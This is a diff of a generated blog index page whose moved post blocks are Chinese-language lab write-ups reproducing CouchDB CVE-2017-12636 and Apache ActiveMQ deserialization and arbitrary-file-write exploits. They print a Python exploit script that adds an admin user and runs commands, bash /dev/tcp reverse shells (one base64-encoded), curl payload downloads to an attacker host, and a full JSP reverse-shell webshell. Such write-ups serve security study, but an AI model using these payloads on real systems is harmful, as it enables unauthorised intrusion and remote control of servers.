@@ -471,129 +471,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (7)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/26/ld (7)/" itemprop="url">Couchdb 任意命令执行漏洞（CVE-2017-12636）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
-                2019-07-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="Couchdb-Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb Couchdb 任意命令执行漏洞（CVE-2017-12636）</h1><p>漏洞原理<br>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。<br>&emsp;<br>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。<br>复现漏洞<br>访问<a href="http://your-ip:5984/即可看到Couchdb的欢迎页面" target="_blank" rel="noopener">http://your-ip:5984/即可看到Couchdb的欢迎页面</a><br><a href="https://imgchr.com/i/mAwouR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwouR.png" alt="mAwouR.png"></a><br>&emsp;<br>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先【增加一个管理员用户】。这里上一个已经登录过了<br><a href="https://imgchr.com/i/mAwXCD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwXCD.png" alt="mAwXCD.png"></a><br>新增query_server配置，写入要执行的命令：<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/_config/query_servers/cmd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/_config/query_servers/cmd&#39;</a> -d ‘“id &gt;/tmp/success”‘<br>“id &gt;/tmp/success”<br>&emsp;<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/zqd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/zqd&#39;</a><br>{“error”:”file_exists”,”reason”:”The database could not be created, the file already exists.”}<br>新建一个临时库和临时表，插入一条记录<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/ddd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd&#39;</a><br>{“ok”:true}<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/ddd/vul&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd/vul&#39;</a> -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’<br>{“ok”:true,”id”:”vul”,”rev”:”1-967a00dff5e02add41819138abb3284d”}<br>调用query_server处理数据。<br>[root@localhost ~]# curl -X PUT <a href="http://zqd:vulhub@192.168.199.217:5984/ddd/_design/vul" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd/_design/vul</a> -d ‘{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’ -H “Content-Type: application/json”<br>{“ok”:true,”id”:”_design/vul”,”rev”:”1-ed713e4db9c7db605913fd62fb102ded”}<br>&emsp;<br>在kali上<br>执行EXP反弹Shell<br>根据上述发送的请求，可使用 python 编写EXP（实验文件exp.py）简化操作，修改EXP中的 target (目标机器地址)和 command （执行的命令），运行脚本即可执行对应的命令。<br>现在我们需要反弹一个可交互的Shell回操作机，本实验的思路是，在操作机中准备好反弹脚本并开启HTTP服务，然后利用EXP让目标 服务器 下载反弹脚本，接着，在操作机使用NC监听本地端口，最后利用EXP在目标服务器中执行反弹脚本，将Shell反弹至操作机监听的端口上，完成反弹Shell操作。<br>反弹Shell的命令，在经过数据库处理时不能直接执行，遂此处分为两步去实现<br>&emsp;<br>准备反弹脚本<br>cd 至 /home/目录下，使用Vim编辑器新建一个index.html文件，写入最终执行的命令，内容如下：<br>bash -i &gt;&amp; /dev/tcp/192.168.199.226/9000 0&gt;&amp;1 这里是本机ip<br><a href="https://imgchr.com/i/mA0ubq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0ubq.png" alt="mA0ubq.png"></a><br>这条命令意思为创建一个可交互的bash和一个到192.168.199.226:9000的TCP链接，然后将bash的输入输出错误都重定向到在191.168.199.226:9000监听的进程中。<br>&emsp;<br>2.另起一个终端，在/home/目录下执行 python -m SimpleHTTPServer 8000 ,开启HTTP服务<br><a href="https://imgchr.com/i/mA0G24" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0G24.png" alt="mA0G24.png"></a><br>3.修改 exp.py 中的 command 的值为 curl 192.168.199.226:8000 -o /tmp/bashell ,保存并执行命令 python exp.py<br>&emsp;</p>
-<p>#!/usr/bin/env python3<br>import requests<br>from requests.auth import HTTPBasicAuth<br>&emsp;<br>target = ‘<a href="http://192.168.199.217:5984&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984&#39;</a>      （这里是靶机ip）<br>command = ‘“curl 192.168.199.226:8000 -o /tmp/bashell”‘<br>version = 1<br>&emsp;<br>session = requests.session()<br>session.headers = {<br>    ‘Content-Type’: ‘application/json’<br>}</p>
-<h1 id="session-proxies"><a href="#session-proxies" class="headerlink" title="session.proxies = {"></a>session.proxies = {</h1><h1 id="‘http’-‘http-127-0-0-1-8085-39"><a href="#‘http’-‘http-127-0-0-1-8085-39" class="headerlink" title="‘http’: ‘http://127.0.0.1:8085&#39;"></a>‘http’: ‘<a href="http://127.0.0.1:8085&#39;" target="_blank" rel="noopener">http://127.0.0.1:8085&#39;</a></h1><h1 id><a href="#" class="headerlink" title="}"></a>}</h1><p>session.put(target + ‘/_users/org.couchdb.user:wooyun’, data=’’’{<br>  “type”: “user”,<br>  “name”: “wooyun”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “wooyun”<br>}’’’)<br>&emsp;<br>session.auth = HTTPBasicAuth(‘wooyun’, ‘wooyun’)<br>&emsp;<br>if version == 1:<br>    session.put(target + (‘/_config/query_servers/cmd’), data=command)<br>else:<br>    host = session.get(target + ‘/_membership’).json()[‘all_nodes’][0]<br>    session.put(target + ‘/_node/{}/_config/query_servers/cmd’.format(host), data=command)<br>%emsp;<br>session.put(target + ‘/wooyun’)<br>session.put(target + ‘/wooyun/test’, data=’{“_id”: “wooyuntest”}’)<br>&emsp;<br>if version == 1:<br>    session.post(target + ‘/wooyun/_temp_view?limit=10’, data=’{“language”:”cmd”,”map”:””}’)<br>else:<br>    session.put(target + ‘/wooyun/_design/test’, data=’{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’)<br>开启http服务<br><a href="https://imgchr.com/i/mABiLR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mABiLR.png" alt="mABiLR.png"></a><br>重新开启一台终端监听<br><a href="https://imgchr.com/i/mAB6YT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAB6YT.png" alt="mAB6YT.png"></a><br>修改 exp.py 中的 command 的值为 bash /tmp/bashell ,保存并执行命令 python exp.py ,成功获取反弹回来的Shell<br><a href="https://imgchr.com/i/mAB2pF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAB2pF.png" alt="mAB2pF.png"></a><br>在反弹回来的Shell中cd 到目录/tmp/下，可以看见运行Poc和Exp时存储的文件<br><a href="https://imgchr.com/i/mABfX9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mABfX9.png" alt="mABfX9.png"></a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (8)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -852,6 +729,129 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (7)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/26/ld (7)/" itemprop="url">Couchdb 任意命令执行漏洞（CVE-2017-12636）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
+                2019-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Couchdb-Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb Couchdb 任意命令执行漏洞（CVE-2017-12636）</h1><p>漏洞原理<br>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。<br>&emsp;<br>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。<br>复现漏洞<br>访问<a href="http://your-ip:5984/即可看到Couchdb的欢迎页面" target="_blank" rel="noopener">http://your-ip:5984/即可看到Couchdb的欢迎页面</a><br><a href="https://imgchr.com/i/mAwouR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwouR.png" alt="mAwouR.png"></a><br>&emsp;<br>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先【增加一个管理员用户】。这里上一个已经登录过了<br><a href="https://imgchr.com/i/mAwXCD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwXCD.png" alt="mAwXCD.png"></a><br>新增query_server配置，写入要执行的命令：<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/_config/query_servers/cmd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/_config/query_servers/cmd&#39;</a> -d ‘“id &gt;/tmp/success”‘<br>“id &gt;/tmp/success”<br>&emsp;<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/zqd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/zqd&#39;</a><br>{“error”:”file_exists”,”reason”:”The database could not be created, the file already exists.”}<br>新建一个临时库和临时表，插入一条记录<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/ddd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd&#39;</a><br>{“ok”:true}<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/ddd/vul&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd/vul&#39;</a> -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’<br>{“ok”:true,”id”:”vul”,”rev”:”1-967a00dff5e02add41819138abb3284d”}<br>调用query_server处理数据。<br>[root@localhost ~]# curl -X PUT <a href="http://zqd:vulhub@192.168.199.217:5984/ddd/_design/vul" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd/_design/vul</a> -d ‘{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’ -H “Content-Type: application/json”<br>{“ok”:true,”id”:”_design/vul”,”rev”:”1-ed713e4db9c7db605913fd62fb102ded”}<br>&emsp;<br>在kali上<br>执行EXP反弹Shell<br>根据上述发送的请求，可使用 python 编写EXP（实验文件exp.py）简化操作，修改EXP中的 target (目标机器地址)和 command （执行的命令），运行脚本即可执行对应的命令。<br>现在我们需要反弹一个可交互的Shell回操作机，本实验的思路是，在操作机中准备好反弹脚本并开启HTTP服务，然后利用EXP让目标 服务器 下载反弹脚本，接着，在操作机使用NC监听本地端口，最后利用EXP在目标服务器中执行反弹脚本，将Shell反弹至操作机监听的端口上，完成反弹Shell操作。<br>反弹Shell的命令，在经过数据库处理时不能直接执行，遂此处分为两步去实现<br>&emsp;<br>准备反弹脚本<br>cd 至 /home/目录下，使用Vim编辑器新建一个index.html文件，写入最终执行的命令，内容如下：<br>bash -i &gt;&amp; /dev/tcp/192.168.199.226/9000 0&gt;&amp;1 这里是本机ip<br><a href="https://imgchr.com/i/mA0ubq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0ubq.png" alt="mA0ubq.png"></a><br>这条命令意思为创建一个可交互的bash和一个到192.168.199.226:9000的TCP链接，然后将bash的输入输出错误都重定向到在191.168.199.226:9000监听的进程中。<br>&emsp;<br>2.另起一个终端，在/home/目录下执行 python -m SimpleHTTPServer 8000 ,开启HTTP服务<br><a href="https://imgchr.com/i/mA0G24" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0G24.png" alt="mA0G24.png"></a><br>3.修改 exp.py 中的 command 的值为 curl 192.168.199.226:8000 -o /tmp/bashell ,保存并执行命令 python exp.py<br>&emsp;</p>
+<p>#!/usr/bin/env python3<br>import requests<br>from requests.auth import HTTPBasicAuth<br>&emsp;<br>target = ‘<a href="http://192.168.199.217:5984&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984&#39;</a>      （这里是靶机ip）<br>command = ‘“curl 192.168.199.226:8000 -o /tmp/bashell”‘<br>version = 1<br>&emsp;<br>session = requests.session()<br>session.headers = {<br>    ‘Content-Type’: ‘application/json’<br>}</p>
+<h1 id="session-proxies"><a href="#session-proxies" class="headerlink" title="session.proxies = {"></a>session.proxies = {</h1><h1 id="‘http’-‘http-127-0-0-1-8085-39"><a href="#‘http’-‘http-127-0-0-1-8085-39" class="headerlink" title="‘http’: ‘http://127.0.0.1:8085&#39;"></a>‘http’: ‘<a href="http://127.0.0.1:8085&#39;" target="_blank" rel="noopener">http://127.0.0.1:8085&#39;</a></h1><h1 id><a href="#" class="headerlink" title="}"></a>}</h1><p>session.put(target + ‘/_users/org.couchdb.user:wooyun’, data=’’’{<br>  “type”: “user”,<br>  “name”: “wooyun”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “wooyun”<br>}’’’)<br>&emsp;<br>session.auth = HTTPBasicAuth(‘wooyun’, ‘wooyun’)<br>&emsp;<br>if version == 1:<br>    session.put(target + (‘/_config/query_servers/cmd’), data=command)<br>else:<br>    host = session.get(target + ‘/_membership’).json()[‘all_nodes’][0]<br>    session.put(target + ‘/_node/{}/_config/query_servers/cmd’.format(host), data=command)<br>%emsp;<br>session.put(target + ‘/wooyun’)<br>session.put(target + ‘/wooyun/test’, data=’{“_id”: “wooyuntest”}’)<br>&emsp;<br>if version == 1:<br>    session.post(target + ‘/wooyun/_temp_view?limit=10’, data=’{“language”:”cmd”,”map”:””}’)<br>else:<br>    session.put(target + ‘/wooyun/_design/test’, data=’{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’)<br>开启http服务<br><a href="https://imgchr.com/i/mABiLR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mABiLR.png" alt="mABiLR.png"></a><br>重新开启一台终端监听<br><a href="https://imgchr.com/i/mAB6YT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAB6YT.png" alt="mAB6YT.png"></a><br>修改 exp.py 中的 command 的值为 bash /tmp/bashell ,保存并执行命令 python exp.py ,成功获取反弹回来的Shell<br><a href="https://imgchr.com/i/mAB2pF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAB2pF.png" alt="mAB2pF.png"></a><br>在反弹回来的Shell中cd 到目录/tmp/下，可以看见运行Poc和Exp时存储的文件<br><a href="https://imgchr.com/i/mABfX9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mABfX9.png" alt="mABfX9.png"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -925,137 +925,6 @@
           
             <hr>
 <h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。<br>1.漏洞利用过程如下：<br>a.构造（可以使用ysoserial）可执行命令的序列化对象<br>b.作为一个消息，发送给目标61616端口<br>c.访问的Web管理页面，读取消息，触发漏洞<br>&emsp;<br>1.使用jmet进行漏洞利用:<br>首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。<br>wget <a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a><br>mkdir external<br>&emsp;<br>2.执行命令<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/zqd” -Yp ROME   192.168.199.120  61616<br><a href="https://imgchr.com/i/mkbKun" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkbKun.png" alt="mkbKun.png"></a><br>&emsp;<br>3现在我们可以通过<a href="http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event到这个队列中所有消息：" target="_blank" rel="noopener">http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event到这个队列中所有消息：</a><br><a href="https://imgchr.com/i/mkbcgH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkbcgH.png" alt="mkbcgH.png"></a><br>&emsp;<br>5.点击查看这条消息即可触发命令执行<br><a href="https://imgchr.com/i/mkb78g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkb78g.png" alt="mkb78g.png"></a><br>&emsp;<br>6反弹shell:<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -i &gt;&amp; /dev/tcp/192.168.199.207/8899 0&gt;&amp;1” -Yp ROME 192.168.199.120  61616<br>这里bash -i &gt;&amp; /dev/tcp/192.168.199.207/12340&gt;&amp;1”需要解码<br><a href="https://imgchr.com/i/mkqnPO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqnPO.png" alt="mkqnPO.png"></a><br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OS4yMDcvODg5OSAwPiYx}|{base64,-d}|{bash,-i}” -Yp ROME 192.168.199.120 61616<br><a href="https://imgchr.com/i/mkqgiT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqgiT.png" alt="mkqgiT.png"></a><br>&emsp;<br>7 远程主机监听8899端口：<br>nc  -lvvp  8899<br>nc -l -p 8899<br><a href="https://imgchr.com/i/mkqqJO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqqJO.png" alt="mkqqJO.png"></a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (2)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/25/ld (2)/" itemprop="url">ActiveMQ任意文件写入</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T09:16:18+08:00">
-                2019-07-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="ActiveMQ任意文件写入"><a href="#ActiveMQ任意文件写入" class="headerlink" title="ActiveMQ任意文件写入"></a>ActiveMQ任意文件写入</h1><p>背景<br>8161为web控制台端口，本漏洞就出现在web控制台中<br>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页<br>面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，<br>fileserver无需登录。<br>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中<br>存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件<br>的缺陷，但后来发现：其使用率并不高而且文件操作容易出现漏洞<br>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在<br>conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。<br>漏洞利用<br>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但<br>不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后<br>使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。<br>文件写入有几种利用方法：</p>
-<ol>
-<li>写入webshell</li>
-<li>写入cron或ssh key等文件</li>
-<li>写入jar或jetty.xml等库和配置文件<br>写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api<br>两个应用都需要登录才能访问，所以有点鸡肋(但默认账号密码都是admin:admin)。写入<br>cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍<br>微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我<br>们需要知道activemq的绝对路径<br>写入webshell<br>写入webshell，需要写在admin或api应用中才能被解析，而这俩应用都需要登录才能访<br>问，默认账号密码为admin:admin，首先访问<a href="http://192.168.199.173:8161/admin/test/systemProperties.jsp，查看ActiveMQ的绝" target="_blank" rel="noopener">http://192.168.199.173:8161/admin/test/systemProperties.jsp，查看ActiveMQ的绝</a><br>对路径<br>&emsp;<br><a href="https://imgchr.com/i/mApALF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mApALF.png" alt="mApALF.png"></a><br>访问<a href="http://192.168.199.173:8161/fileserver/并用burp抓包，方便直接修改，改为PUT" target="_blank" rel="noopener">http://192.168.199.173:8161/fileserver/并用burp抓包，方便直接修改，改为PUT</a> 包，填写文件名，并且内容写入Cknife的jsp马，返回204即为成功<br>&lt;%@page import=”java.lang.*”%&gt;<br>&lt;%@page import=”java.util.*”%&gt;<br>&lt;%@page import=”java.io.*”%&gt;<br>&lt;%@page import=”java.net.*”%&gt;</li>
-</ol>
-<p>&lt;%<br>class StreamConnector extends Thread<br>{<br>InputStream sn;<br>OutputStream gy;</p>
-<p>StreamConnector( InputStream sn, OutputStream gy )<br>{<br>this.sn = sn;<br>this.gy = gy;<br>}</p>
-<p>public void run()<br>{<br>BufferedReader jy = null;<br>BufferedWriter qvo = null;<br>try<br>{<br>jy = new BufferedReader( new InputStreamReader( this.sn ) );<br>qvo = new BufferedWriter( new OutputStreamWriter( this.gy ) );<br>char buffer[] = new char[8192];<br>int length;<br>while( ( length = jy.read( buffer, 0, buffer.length ) ) &gt; 0 )<br>{<br>qvo.write( buffer, 0, length );<br>qvo.flush();<br>}<br>} catch( Exception e ){}<br>try<br>{<br>if( jy != null )<br>jy.close();<br>if( qvo != null )<br>qvo.close();<br>} catch( Exception e ){}<br>}<br>}</p>
-<p>try<br>{<br>String ShellPath;<br>if (System.getProperty(“os.name”).toLowerCase().indexOf(“windows”) == -1) {<br>ShellPath = new String(“/bin/sh”);<br>} else {<br>ShellPath = new String(“cmd.exe”);<br>}</p>
-<p>Socket socket = new Socket( “192.168.199.226”, 9999 );<br>Process process = Runtime.getRuntime().exec( ShellPath );<br>( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();<br>( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();<br>} catch( Exception e ) {}<br>%&gt;<br><a href="https://imgchr.com/i/mAp3LD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mAp3LD.png" alt="mAp3LD.png"></a><br>访问<a href="http://192.168.199.173:8161/api/" target="_blank" rel="noopener">http://192.168.199.173:8161/api/</a><br><a href="https://imgchr.com/i/mApwSP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mApwSP.png" alt="mApwSP.png"></a><br>移动到web目录下的api文件夹(/opt/activemq/webapps/api/3.jsp)中(admin目录下jsp也<br>可被解析)<br>Destination:file:///opt/activemq/webapps/api/3.jsp<br><a href="https://imgchr.com/i/mApseg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mApseg.png" alt="mApseg.png"></a><br>访问无报错则已经成功移动<br><a href="https://imgchr.com/i/mApomF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mApomF.png" alt="mApomF.png"></a><br>kali机器，msfconsole启动msf，使用监听模块/exploit/multi/hanlter进行监听，网页再<br>次访问：<br><a href="https://imgchr.com/i/mA9Mkj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mA9Mkj.png" alt="mA9Mkj.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mA9Qts" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mA9Qts.png" alt="mA9Qts.png"></a></p>
 
           
         
@@ -1349,6 +1218,137 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (2)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
